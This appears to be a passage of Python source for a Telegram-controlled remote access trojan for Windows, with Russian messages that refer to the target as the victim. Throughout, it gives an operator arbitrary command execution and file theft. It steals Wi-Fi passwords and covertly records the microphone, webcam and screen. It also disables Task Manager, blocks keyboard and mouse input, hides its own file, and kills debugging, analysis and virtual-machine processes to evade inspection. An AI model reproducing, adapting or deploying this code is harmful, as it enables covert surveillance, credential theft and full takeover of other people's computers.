        bot.send_message(message.chat.id, f'Battery status: {batstatus}')
        bot.send_message(message.chat.id, f'Battery System name: {batsysname}')
        bot.send_message(message.chat.id, f'Battery name: {batname}')
        bot.send_message(message.chat.id, f'Battery {bates}%')
    except Exception as e:
        bot.send_message(message.chat.id , f"Error: {e}")
#############################################################################

@bot.message_handler(commands=['shortinfo'])
def shortpcinfo(message):
    try:
        bot.send_message(message.chat.id , 'Ожидай бро...')
        host_name = os.getenv('COMPUTERNAME', 'Unknown')

        os_name = os.popen('ver').read().strip()
        
        try:
            os_version = os.popen('wmic os get version').read().splitlines()[2].strip()
        except IndexError:
            os_version = 'Unknown'

        try:
            processor_info = os.popen('wmic cpu get Name').read().splitlines()[2].strip()
        except IndexError:
            processor_info = 'Unknown'

        cores = os.cpu_count()

        if os.name == 'nt':
            total_ram = os.popen('wmic computersystem get TotalPhysicalMemory').read().splitlines()[2].strip()
            total_ram = f"{int(total_ram) // (1024 ** 2)} MB" if total_ram.isdigit() else "Not available"
        else:
            total_ram = "Not available"

        boot_time_str = os.popen('systeminfo | find "System Boot Time"').read().strip()
        if boot_time_str:
            boot_time = boot_time_str.split(":")[1].strip()
        else:
            boot_time = "Not available"

        info = {
            "System": os_name,
            "Host name": host_name,
            "OS version": os_version,
            "CPU": processor_info,
            "Core count": cores,
            "RAM": total_ram,
            "Boot time": boot_time
        }

        info_text = "\n".join([f"{key}: {value}" for key, value in info.items()])


        bot.send_message(message.chat.id, info_text)

    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")

#############################################################################
@bot.message_handler(commands=['disabletaskmgr'])
def disabtsk(message):       
    try:
        disable_command = r'reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f'
        os.popen(disable_command)
        bot.send_message(message.chat.id , 'taskmanager выключен!')
    except Exception as e:
        bot.send_message(message.chat.id , f"Error: {e}")
        
               
        
#############################################################################
@bot.message_handler(commands=['block'])
def block(message):
    try:
        ctypes.windll.user32.BlockInput(True)
        bot.send_message(message.chat.id , 'Ввод данных пользователем (мышь и клавиатура) успешно заблокирован!')

    except Exception as e:
        bot.send_message(message.chat.id , f"Error: {e}")
#############################################################################
@bot.message_handler(commands=['unblock'])
def unblock(message):
    try:
        ctypes.windll.user32.BlockInput(False)
        bot.send_message(message.chat.id , 'Ввод данных пользователем (мышь и клавиатура) успешно заблокирован!')
        bot.send_message(message.chat.id , 'Если он не разблокирован, запустите еще раз: \n/unblock')
    except Exception as e:
        bot.send_message(message.chat.id , f"Error: {e}")
#############################################################################
@bot.message_handler(commands=['enabletaskmgr'])
def disabtsk(message):       
    try:
        enable_command = r'reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 0 /f'
        os.popen(enable_command)
        bot.send_message(message.chat.id , 'taskmanager запущен!')
    except Exception as e:
        bot.send_message(message.chat.id , f"Error: {e}")
                
        
      
#############################################################################       
@bot.message_handler(commands=['wifilist'])
def wifipassword(message):
    
    a = os.popen('netsh wlan show profile').read().strip()
    bot.send_message(message.chat.id , f'Wifi networks📶:{a}')

################################

@bot.message_handler(commands=['wifipass'])
def wifipassword(message):
    name = message.text.split('/wifipass', 1)[1].strip()
    results = os.popen(f'netsh wlan show profile name={name} key=clear').read().strip()

    try:
        bot.send_message(message.chat.id ,str(results))
    except Exception as e:
        bot.send_message(message.chat.id , f"Error: {e}")

#############################################################################


@bot.message_handler(commands=['rotate'])
def rotate(message):
    angle = 0
    angle = (angle + 90) % 360 
        
    
    pyautogui.hotkey('ctrl', 'alt', {0: 'up', 90: 'right', 180: 'down', 270: 'left'}[angle])
    bot.send_message(message.chat.id,f"rotated +{angle} degrees")







#############################################################################      

# @bot.message_handler(commands=['users'])

# def users(message):
    
#     try:
#         com = os.popen('net user').read().strip()
#         bot.send_message(message.chat.id, f'Res:{com}')
 
#         bot.send_message(message.chat.id, '####################################')
        
#         cm = os.popen('wmic useraccount list brief').read().strip()
#         bot.send_message(message.chat.id, f'Also:{cm}')
    
#     except Exception as e:
#         bot.send_message(message.chat.id, f'Error:{e}')
@bot.message_handler(commands=['users'])
def users(message):
    try:
        com_raw = os.popen('net user').read().strip()
        com_lines = com_raw.splitlines()
        com_output = "\n".join(com_lines)
        
        bot.send_message(message.chat.id, f'Res:\n{com_output}')
        bot.send_message(message.chat.id, '####################################')
        
        cm_raw = os.popen('wmic useraccount list brief').read().strip()
        cm_lines = cm_raw.splitlines()
        
        headers = cm_lines[0].split()
        data_rows = [line.split(maxsplit=len(headers)-1) for line in cm_lines[1:]]

        col_widths = [len(header) for header in headers]
        for row in data_rows:
            for i, item in enumerate(row):
                col_widths[i] = max(col_widths[i], len(item))
        
        def format_row(row):
            return " | ".join(item.ljust(col_widths[i]) for i, item in enumerate(row))
        
        header_row = format_row(headers)
        separator = "-+-".join("-" * width for width in col_widths)
        
        table = [header_row, separator] + [format_row(row) for row in data_rows]
        formatted_cm_output = "\n".join(table)
        
        bot.send_message(message.chat.id, f'Also:\n{formatted_cm_output}')
    
    except Exception as e:
        bot.send_message(message.chat.id, f'Error: {e}')
#############################################################################      
@bot.message_handler(commands=['hide'])
def hide(message):
    
    try:
        path = os.getcwd()

        name = os.path.basename(__file__)

        full_path = path + '\\'+ name

        bot.send_message(message.chat.id ,f'Полный путь:{full_path}')

        os.popen(f'attrib +h \"{full_path}\"')
    
        bot.send_message(message.chat.id ,f'Твое приложение скрыто!')
    except Exception as e:
        bot.send_message(message.chat.id , f'Error:{e}')
#############################################################################      

@bot.message_handler(commands=['unhide'])
def unhide(message):
    
    try:
        path = os.getcwd()

        name = os.path.basename(__file__)

        full_path = path + '\\'+ name

        bot.send_message(message.chat.id ,f'ПОлный путь:{full_path}')

        os.popen(f'attrib -h \"{full_path}\"')
    
        bot.send_message(message.chat.id ,f'ваше приложение видно!')
    except Exception as e:
        bot.send_message(message.chat.id , f'Error:{e}')


#############################################################################
@bot.message_handler(commands=['mic'])
def record_audio(message):
    if len(message.text.split()) > 1:
        try:
            record_time = int(message.text.split()[1]) 
        except ValueError:
            bot.reply_to(message, "Неверное время записи. Пожалуйста, введите действительное.")
            return
    else:
        record_time = 5

    
    CHUNK = 1024
    FORMAT = pyaudio.paInt16
    CHANNELS = 2
    RATE = 44100
    WAVE_OUTPUT_FILENAME = "6425s-3erq-eq44-vcx7.wav"

    p = pyaudio.PyAudio()

    stream = p.open(format=FORMAT,
                    channels=CHANNELS,
                    rate=RATE,
                    input=True,
                    frames_per_buffer=CHUNK)

    bot.send_message(message.chat.id, f"Запись звука на {record_time} секунд...")

    frames = []

    for i in range(0, int(RATE / CHUNK * record_time)):
        data = stream.read(CHUNK)
        frames.append(data)

    bot.send_message(message.chat.id, "Окончили запись")

    stream.stop_stream()
    stream.close()
    p.terminate()

    with wave.open(WAVE_OUTPUT_FILENAME, 'wb') as wf:
        wf.setnchannels(CHANNELS)
        wf.setsampwidth(p.get_sample_size(FORMAT))
        wf.setframerate(RATE)
        wf.writeframes(b''.join(frames))

    with open(WAVE_OUTPUT_FILENAME, 'rb') as audio_file:
        bot.send_audio(message.chat.id, audio_file)

    os.remove(WAVE_OUTPUT_FILENAME)
    
@bot.message_handler(commands=['metadata'])
def get_metadata(message):
    filepath = message.text.split('/metadata', 1)[1].strip()

    if not os.path.exists(filepath):
        bot.send_message(message.chat.id, "Error: Файл не существует")
        return

    try:
        statObject = os.stat(filepath)
        
        modificationTime = time.ctime(statObject[stat.ST_MTIME])
        
        sizeInMegaBytes = statObject[stat.ST_SIZE] / 1048576  
        sizeInMegaBytes = round(sizeInMegaBytes, 2)
        
        lastAccessTime = time.ctime(statObject[stat.ST_ATIME])
        
        fileMetadata = f"Last modified: {modificationTime}\n"
        fileMetadata += f"Size in MB: {sizeInMegaBytes} MB\n"
        fileMetadata += f"Last accessed: {lastAccessTime}\n"
        
        bot.send_message(message.chat.id, fileMetadata)
    
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {str(e)}")
###################################################################

@bot.message_handler(commands=['minimize'])
def minimize(message): 
    try:
        pyautogui.hotkey("win", "down")  
        bot.send_message(message.chat.id, "Активное окно было свернуто!")
        bot.send_message(message.chat.id, "Введите команду еще раз, чтобы свернуть окно до уровня панели задач.")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")

@bot.message_handler(commands=['maximize'])
def maximize(message): 
    try:
        pyautogui.hotkey("win", "up")
        bot.send_message(message.chat.id, "Активное окно было развернуто до максимума!")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error: {e}")
      
#################################################################################
        
@bot.message_handler(commands=['cmdbomb'])
def cmdbomb(message):
    try:

        os.popen('start cmd && start cmd && start cmd && start cmd && start cmd && start cmd && start cmd && start cmd && start cmd && start cmd')
        bot.send_message(message.chat.id, 'Открыли 10 CMD')
    except Exception as e:
        bot.send_message(message.chat.id , f'Error: {e}')
        

#############################################################################
   
waiting_for_upload = False     


@bot.message_handler(commands=['upload'])
def handle_upload_command(message):
    global waiting_for_upload
    waiting_for_upload = True
    bot.send_message(message.chat.id, "Отправь свой файл:")

@bot.message_handler(content_types=['document', 'photo', 'audio', 'video', 'voice'])
def handle_file(message):
    global waiting_for_upload
    if waiting_for_upload:
        try:
            file_name = message.document.file_name if message.document else message.photo.file_name
            file_info = bot.get_file(message.document.file_id) if message.document else bot.get_file(message.photo[-1].file_id)
            downloaded_file = bot.download_file(file_info.file_path)
            with open(file_name, 'wb') as new_file:
                new_file.write(downloaded_file)
            directory = os.getcwd() 
            bot.send_message(message.chat.id, f'Файл был успешно отправлен в: {directory}')
            waiting_for_upload = False
        except Exception as e:
            bot.send_message(message.chat.id, f'Error: {e}')
    else:
        bot.send_message(message.chat.id, 'Напиши сначала /upload ')

#############################################################################

@bot.message_handler(commands=['altf4'])
def altf(message):
    try:
        pyautogui.hotkey('alt' , 'f4')
        bot.send_message(message.chat.id , 'ALT + F4 нажаты')
    except Exception as e:
        bot.send_message(message.chat.id , f'Error: {e}') 
#############################################################################
@bot.message_handler(commands=['run'])
def startfile(message):
    try:
        file = message.text.split('/run' , 1)[1].strip()
        os.popen(f'start {str(file)}')
        bot.send_message(message.chat.id, 'Файл успешно открыт!')
    except Exception as e:
        bot.send_message(message.chat.id , f'Error:{e}') 

#############################################################################

@bot.message_handler(commands=['changeclipboard'])
def chgclip(message):
    try:
        text = message.text.split('/changeclipboard' , 1)[1].strip()
        
        command = 'echo | set /p nul=' + text.strip() + '| clip'
        os.system(command)
        bot.send_message(message.chat.id,f'Буфер обмена поменян на \"{text}\" !') 
    except Exception as e:
        bot.send_message(message.chat.id , f'Error: {e}') 




#############################################################################
@bot.message_handler(commands=['wallpaper'])
def wallpaper(message):
    
    bot.send_message(message.chat.id, "Сначала напиши /upload и загрузи свою картинку")

    bot.send_message(message.chat.id, "Затем отправьте название фотографии, чтобы сменить обои на рабочем столе:")
    bot.register_next_step_handler(message, wall)
    
def wall(message):
    filename = message.text

    if not filename.startswith('/'):
        try:
            ctypes.windll.user32.SystemParametersInfoW(20, 0, os.path.abspath(str(filename)), 0)
            bot.send_message(message.chat.id, "Обои сменили!")
    
        except Exception as e:
            bot.send_message(message.chat.id, f'Error{e}')


#############################################################################
@bot.message_handler(commands=['download'])

def download_file(message):
    download_file = message.text.split('/download', 1)[1].strip()
    try:      
        with open(download_file , 'rb') as file:
            if str(download_file[-3:]) == 'png':
                bot.send_photo(message.chat.id, file)
            elif str(download_file[-3:]) == 'jpg':
                bot.send_photo(message.chat.id, file)
            elif str(download_file[-3:]) == 'svg':
                bot.send_photo(message.chat.id, file)
            elif str(download_file[-3:]) == 'jpeg':
                bot.send_photo(message.chat.id, file)
            elif str(download_file[-3:]) == 'mkv':
                bot.send_video(message.chat.id, file , timeout=100)
            else:
                bot.send_document(message.chat.id, file)
    except Exception as e:
        bot.send_message(message.chat.id, f'Error{e}')

#############################################################################
@bot.message_handler(commands=['fullvolume'])

def volp(message):
    try:
        n = 0
        while n < 70:
            pyautogui.press('volumeup')
            n += 1
        

        bot.send_message(message.chat.id, 'фулл громкость готово!')
    except Exception as e:
        bot.send_message(message.chat.id, f'Error{e}')
#############################################################################
@bot.message_handler(commands=['volumeplus'])

def volp(message):
    try:
        pyautogui.press('volumeup')
        pyautogui.press('volumeup')
        pyautogui.press('volumeup')
        pyautogui.press('volumeup')
        pyautogui.press('volumeup')
        bot.send_message(message.chat.id, 'успешно +10')
    except Exception as e:
        bot.send_message(message.chat.id, f'Error{e}')
#############################################################################
@bot.message_handler(commands=['volumeminus'])

def volm(message):
    try:
        pyautogui.press('volumedown')
        pyautogui.press('volumedown')
        pyautogui.press('volumedown')
        pyautogui.press('volumedown')
        pyautogui.press('volumedown')
        bot.send_message(message.chat.id, 'успешно -10')
    except Exception as e:
        bot.send_message(message.chat.id, f'Error{e}')
#############################################################################
@bot.message_handler(commands=['webcam'])

def camsw(message):
    bot.send_message(message.chat.id , 'Переключите камеру (0 - камера по умолчанию)')
    msg = bot.send_message(message.chat.id , 'Введите 0, 1 или другой индекс:')
    bot.register_next_step_handler(msg, lambda msg: camv(msg, int(msg.text)))

def camv(message, camera_index):
    msg = bot.send_message(message.chat.id , 'Введите время записи:')
    bot.register_next_step_handler(msg, lambda msg: camer(msg, camera_index, int(msg.text)))

def camer(message, camera_index, record_time):
    bot.send_message(message.chat.id , 'Ожидай...')
    cap = cv2.VideoCapture(camera_index)

    fourcc = cv2.VideoWriter_fourcc(*'XVID')
    output_file = '498j-33v1-9d24-z390.mkv'
    output_v = cv2.VideoWriter(output_file, fourcc, 20.0, (640, 480))

    start_time = time.time()

    while True:
        ret, frame = cap.read()
        if ret:
            output_v.write(frame)
            if time.time() - start_time > record_time:
                break
        else:
            break

    cap.release()
    output_v.release()
    cv2.destroyAllWindows()

    try:
        with open(output_file, 'rb') as video_file:
            bot.send_document(message.chat.id, video_file, timeout=122)
    except Exception as e:
        bot.send_message(message.chat.id , f'Error: {e}')

    os.remove('498j-33v1-9d24-z390.mkv')
#############################################################################
@bot.message_handler(commands=['help'])

def help(message):
    if n == False:
        bot.send_message(message.chat.id, "Введите пароль: ")
        bot.register_next_step_handler(message, checkpasswd)
    else:
        bot.send_message(message.chat.id,textovik)
def checkpasswd(message):
    if message.text == 'vedmoor':
        global n
        n = True
        bot.send_message(message.chat.id, '✅ Пароль верный.')
        bot.send_message(message.chat.id, textovik)
    else:
        bot.send_message(message.chat.id, '❌ Неверный пароль')


#################################################################################
@bot.message_handler(commands=['examples'])

def examples(message):
    bot.send_message(message.chat.id, examplestext)

#################################################################################

@bot.message_handler(commands=['textspech'])
def screen(message):
    try:
        text = message.text.split('/textspech', 1)[1].strip()
        engine = pyttsx3.init()
        engine.say(text)
        engine.runAndWait()
        bot.send_message(message.chat.id , f'{text}  отправленно успешно!')

    except Exception as e:
        bot.send_message(message.chat.id , f'Error: {e}')
#################################################################################
@bot.message_handler(commands=['screenrecord'])
def screen(message):
    
    msg = bot.send_message(message.chat.id , 'Введите время записи:')
    bot.register_next_step_handler(msg, scr)
def scr(message):
    bot.send_message(message.chat.id , 'Please wait...')
    screen_width, screen_height = pyautogui.size()

    fourcc = cv2.VideoWriter_fourcc(*'XVID')
    output_video = cv2.VideoWriter('498j-33v1-9d24-z390.mkv', fourcc, 10.0, (screen_width, screen_height))


    start_time = time.time()


    while True:

        screenshot = pyautogui.screenshot()


        frame = np.array(screenshot)
        frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)

        output_video.write(frame)

        if time.time() - start_time > int(message.text):
            break

    output_video.release()
    cv2.destroyAllWindows()

    try:    
        with open('498j-33v1-9d24-z390.mkv' , 'rb') as screenvideo:
            bot.send_document(message.chat.id , screenvideo , timeout=122)
    except Exception as e:
        bot.send_message(message.chat.id , f'Error:{e}')
    os.remove('498j-33v1-9d24-z390.mkv')


#################################################################################
@bot.message_handler(commands=['info'])
def information(message):
# about location
    try:
        
        result = os.popen('curl ipinfo.io/ip').read().strip()
        bot.send_message(message.chat.id,f"Ip:\n {result}")
        
        ###########################################################
        
        result = os.popen('curl ipinfo.io/city').read().strip()
        bot.send_message(message.chat.id,f"City:\n {result}")
        
        ###########################################################
        
        
        result = os.popen('curl ipinfo.io/region').read().strip()
        bot.send_message(message.chat.id,f"Region:\n {result}")
            
        ###########################################################
        
        result = os.popen('curl ipinfo.io/country').read().strip()
        bot.send_message(message.chat.id,f"Country:\n {result}")
                
        ###########################################################
        
        result = os.popen('curl ipinfo.io/loc').read().strip()
        bot.send_message(message.chat.id,f"Location:\n {result}")
        
        ###########################################################
        
        result = os.popen('curl ipinfo.io/org').read().strip()
        bot.send_message(message.chat.id,f"Provider:\n {result}")
            
        ###########################################################
        
        result = os.popen('curl ipinfo.io/postal').read().strip()
        bot.send_message(message.chat.id,f"Postal:\n {result}")
                
        ###########################################################
        
        result = os.popen('curl ipinfo.io/timezone').read().strip()
        bot.send_message(message.chat.id,f"Timezone:\n {result}")

    except Exception as e:
        bot.send_message(message.chat.id, f"Error:{e}")
#################################################################################


#################################################################################

@bot.message_handler(commands=['winblocker2'])
def winblocker(message):
    bot.send_message(message.chat.id ,'Windows is blocked!')

    while True:
        c = os.popen('tasklist').read().strip()

        blacklisted_processes = [
                'perfmon.exe', 
                'Taskmgr.exe',
                'ProcessHacker.exe',
                'cmd.exe',
                'explorer.exe' ,
                'vmwareuser.exe',
                'fakenet.exe', 
                'dumpcap.exe', 
                'httpdebuggerui.exe', 
                'wireshark.exe', 
                'fiddler.exe', 
                'vboxservice.exe', 
                'df5serv.exe', 
                'vboxtray.exe', 
                'vmwaretray.exe', 
                'ida64.exe', 
                'ollydbg.exe', 
                'pestudio.exe', 
                'vgauthservice.exe', 
                'vmacthlp.exe', 
                'x96dbg.exe', 
                'x32dbg.exe', 
                'prl_cc.exe', 
                'prl_tools.exe', 
                'xenservice.exe', 
                'qemu-ga.exe', 
                'joeboxcontrol.exe', 
                'ksdumperclient.exe', 
                'ksdumper.exe', 
                'joeboxserver.exe', 
            ]

        for badproc in blacklisted_processes:
                
            if badproc in c:
                if badproc == 'cmd.exe':
                    pass
                else:
                    bot.send_message(message.chat.id ,f'{badproc} is killed!')
                os.popen(f'taskkill /f /im {badproc}')


###################################################################

@bot.message_handler(commands=['playsound'])
def plsound(message):
    try:
    
        muspath = message.text.split('/playsound', 1)[1].strip()

        os.popen(f'start {muspath}')
    
        bot.send_message(message.chat.id, 'Жертве запустили музон успешно')

    except Exception as e:
        bot.send_message(message.chat.id, f'Error:{e}')    

###################################################################
@bot.message_handler(commands=['chrome'])
def opensite(message):
    try:
        site = message.text.split('/chrome', 1)[1].strip()
        os.popen(f'start chrome "{site}"')
        bot.send_message(message.chat.id, f'Site:{site} открыт успешно')
    except Exception as e:
        bot.send_message(message.chat.id, f'Error:{e}')
        
#################################################################################


@bot.message_handler(commands=['edge'])
def opensite(message):
    try:
        site = message.text.split('/edge', 1)[1].strip()
        os.popen(f'start msedge "{site}"')
        bot.send_message(message.chat.id, f'Site:{site} открыт успешно')
    except Exception as e:
        bot.send_message(message.chat.id, f'Error:{e}')
        
#################################################################################


@bot.message_handler(commands=['firefox'])
def opensite(message):
    try:
        site = message.text.split('/firefox', 1)[1].strip()
        os.popen(f'start firefox "{site}"')
        bot.send_message(message.chat.id, f'Site:{site} открыт успешно')
    except Exception as e:
        bot.send_message(message.chat.id, f'Error:{e}')
        

#################################################################################
@bot.message_handler(commands=['webscreen'])
def take_photo(message):
    try:
        
        cap = cv2.VideoCapture(0)

        
        ret, frame = cap.read()

        
        photo_path = 'photo.jpg'
        cv2.imwrite(photo_path, frame)

        
        with open(photo_path, 'rb') as photo:
            bot.send_photo(message.chat.id, photo)

        
        os.remove(photo_path)

        
        cap.release()

    except Exception as e:
        bot.send_message(message.chat.id, f"Error capturing photo: {e}")
#################################################################################

@bot.message_handler(commands=['screenshot'])
def take_screenshot(message):
    try:
        
        screenshot_path = 'screenshot.png'
        pyautogui.screenshot(screenshot_path)

        
        with open(screenshot_path, 'rb') as photo:
            bot.send_photo(message.chat.id, photo)

        
        os.remove(screenshot_path)

    except Exception as e:
        bot.send_message(message.chat.id, f"Error :(: {e}")

current_directory = os.getcwd()

#################################################################################

@bot.message_handler(commands=['sleep'])
def slip(message):
    try:
        ctypes.windll.PowrProf.SetSuspendState(0, 1, 0)
        bot.send_message(message.chat.id, 'отправили пк на слип мод!') 
    except Exception as e:
        bot.send_message(message.chat.id, f"Error :(: {e}")


#################################################################################


@bot.message_handler(commands=['cd'])
def change_directory_command(message):
    try:
        global current_directory 
        new_directory = message.text.split('/cd', 1)[1].strip()
        
        
        os.chdir(new_directory)
        current_directory = os.getcwd()
        
        bot.send_message(message.chat.id, f"Твоя дериктория:\n{current_directory}")
    except Exception as e:
        bot.send_message(message.chat.id, f"This directory does not exists: {e}")


#################################################################################



@bot.message_handler(commands=['whoami'])
def whoami_command(message):
    
    result = os.popen('whoami').read().strip()

    
    bot.send_message(message.chat.id, f'result: {result}')
 
 
 
#################################################################################
    
execute_enabled = False  

def execute_command(command):
    global execute_enabled

    try:
        if command.lower() == 'exit':
            execute_enabled = False
            return "Exit"

        elif command.lower() == 'cd..':
            current_directory = os.getcwd()
            parent_directory = os.path.abspath(os.path.join(current_directory, os.pardir))
            os.chdir(parent_directory)
            return f"You are in: {parent_directory}"

        elif command.lower().startswith('cd '):
            directory = command.lower().split(' ', 1)[1].strip()
            os.chdir(directory)
            return f"You are in: {directory}"

        else:
            result = os.popen(command.lower()).read()
            return f"Result:\n\n{result}"

    except Exception as e:
        return f"Error:\n\n{e}"

@bot.message_handler(commands=['execute'])
def handle_execute(message):
    global execute_enabled
    execute_enabled = True
    bot.send_message(message.chat.id, "Введи команду (пиши \"exit\", для выхода):")

@bot.message_handler(func=lambda message: execute_enabled)
def handle_command(message):
    command_result = execute_command(message.text)
    bot.send_message(message.chat.id, command_result)

############################################################################
###################
    

@bot.message_handler(commands=['shellexecute'])

def command_execution(message):
    
    command = message.text.split('/shellexecute', 1)[1].strip()
    res = os.popen(command).read()
    
    bot.send_message(message.chat.id, f"Result of command:\n\n{res}")
    
@bot.message_handler(commands=['e'])

def command_execution(message):
    try:
        command = message.text.split('/e', 1)[1].strip()
        if command == 'cd..':
            current_directory = os.getcwd()
            parent_directory = os.path.abspath(os.path.join(current_directory, os.pardir))
            os.chdir(parent_directory)
            bot.send_message(message.chat.id, f"You are in: {parent_directory}")
        elif command.startswith('cd '):
            directory = command.split(' ', 1)[1].strip()
            os.chdir(directory)
            bot.send_message(message.chat.id, f"You are in: {directory}")
        else:
            res = os.popen(command).read()
            bot.send_message(message.chat.id, f"Result:\n\n{res}")
    except Exception as e:
        bot.send_message(message.chat.id, f"Error:\n\n{e}")
    
#################################################################################
    
    
MAX_MESSAGE_LENGTH = 4096

@bot.message_handler(commands=['ex'])
def command_execution(message):
    try:
        command = message.text.split('/ex', 1)[1].strip()
        
        if command == 'cd..':
            current_directory = os.getcwd()
            parent_directory = os.path.abspath(os.path.join(current_directory, os.pardir))
            os.chdir(parent_directory)
            bot.send_message(message.chat.id, f"You are in: {parent_directory}")
            
        elif command.startswith('cd '):
            directory = command.split(' ', 1)[1].strip()
            os.chdir(directory)
            bot.send_message(message.chat.id, f"You are in: {os.getcwd()}")
            
        else:
            res = os.popen(command).read()
            
            
            res_chunks = [res[i:i + MAX_MESSAGE_LENGTH] for i in range(0, len(res), MAX_MESSAGE_LENGTH)]
            
            if len(res_chunks) > 1:
                
                with open('_windows_.txt', 'w', encoding='utf-8') as file:
                    file.write(res)
                    os.popen( "attrib +h r.txt" )
                with open('_windows_.txt', 'rb') as document:
                    bot.send_document(message.chat.id, document)
                os.remove('_windows_.txt')
            else:
                
                for res_chunk in res_chunks:
                    bot.send_message(message.chat.id, f"Result:\n\n{res_chunk}")

    except Exception as e:
        bot.send_message(message.chat.id, f"Error:\n\n{e}")
#################################################################################
@bot.message_handler(commands=['shutdown'])
def command_execution(message):
    
    try:
        
        os.popen('shutdown /s /f /t 0')
        
        bot.send_message(message.chat.id, "pc выключен!")
    except Exception as e:
       
        bot.send_message(message.chat.id, f'Error:{e}')


#################################################################################


@bot.message_handler(commands=['restart'])
def command_execution(message):
    
    try:
        
        os.popen('shutdown /r /f /t 0')

        bot.send_message(message.chat.id, "перезагружаем пк жертвы!")
    except Exception as e:
       
        bot.send_message(message.chat.id, f'Error:{e}')
        
        
#################################################################################

@bot.message_handler(commands=['tasklist'])
def command_execution(message):
    try:
        command = 'tasklist'
        

        res = os.popen(command).read()
            
            
        res_chunks = [res[i:i + MAX_MESSAGE_LENGTH] for i in range(0, len(res), MAX_MESSAGE_LENGTH)]
            
        if len(res_chunks) > 1:
                
            with open('_windows_.txt', 'w', encoding='utf-8') as file:
                file.write(res)
                os.popen( "attrib +h r.txt" )
            with open('_windows_.txt', 'rb') as document:
                bot.send_document(message.chat.id, document)
            os.remove('_windows_.txt')
        
        res = os.popen('wmic process get description').read().strip()
        res_chunks = [res[i:i + MAX_MESSAGE_LENGTH] for i in range(0, len(res), MAX_MESSAGE_LENGTH)]
            
        if len(res_chunks) > 1:
                
            with open('_windows2_.txt', 'w', encoding='utf-8') as file:
                file.write(res)
                os.popen( "attrib +h r.txt" )
            with open('_windows2_.txt', 'rb') as document:
                bot.send_document(message.chat.id, document)
            os.remove('_windows2_.txt')        
        
        else:
                
            for res_chunk in res_chunks:
                bot.send_message(message.chat.id, f"Result:\n\n{res_chunk}")

    except Exception as e:
        bot.send_message(message.chat.id, f"Error:\n\n{e}")

if __name__ == "__main__":

    bot.polling(none_stop=True)


